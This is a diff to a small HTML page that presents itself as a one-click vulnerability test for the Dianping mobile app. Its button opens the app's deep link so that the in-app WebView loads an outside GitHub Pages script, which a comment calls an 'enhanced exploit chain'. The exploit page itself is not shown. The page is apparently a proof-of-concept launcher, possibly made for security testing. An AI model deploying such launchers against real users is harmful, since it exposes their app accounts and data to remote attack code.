@@ -4,19 +4,36 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DP KNB 一键测试</title>
+    <style>
+        body { font-family: system-ui; text-align: center; padding: 50px 20px; }
+        button { padding: 16px 32px; font-size: 18px; background: #06c; color: #fff; border: none; border-radius: 8px; }
+        .note { color: #666; margin-top: 20px; }
+    </style>
 </head>
 <body>
-    <h2>点击下方按钮唤起大众点评APP并执行测试</h2>
-    <button onclick="openDPApp()">打开点评APP并开始测试</button>
-    <p>如果没有反应，请确保已安装大众点评APP。</p>
+    <h2>📱 大众点评 App 漏洞验证</h2>
+    <p>点击下方按钮，将唤起大众点评 App 并自动执行测试脚本</p>
+    <button onclick="launchDP()">🚀 打开点评 App 开始测试</button>
+    <p class="note">如果未安装 App 或无法唤起，请确保您已安装大众点评。</p>
 
     <script>
-        // 跳转到APP内置WebView并加载测试脚本
-        function openDPApp() {
-            // 用大众点评的Schema链接，在APP内打开你的测试页面
-            const targetUrl = encodeURIComponent("https://cxd122.github.io/dp-knb-test/cxd.html");
-            const schemaUrl = `dianping://webview/open?url=${targetUrl}`;
-            window.location.href = schemaUrl;
+        function launchDP() {
+            // 您的测试页面地址（确保已更新为增强版利用链）
+            const testPageUrl = "https://cxd122.github.io/dp-knb-test/cxd.html";
+            const encodedUrl = encodeURIComponent(testPageUrl);
+            
+            // 标准 Scheme
+            const schema = `dianping://web?url=${encodedUrl}`;
+            
+            // 尝试唤起
+            window.location.href = schema;
+            
+            // 可选：若 2 秒后未离开页面，提示用户手动点击（部分浏览器会拦截）
+            setTimeout(() => {
+                if (!document.hidden) {
+                    alert('若未自动跳转，请确认已安装大众点评 App，并允许浏览器打开外部应用。');
+                }
+            }, 2000);
         }
     </script>
 </body>
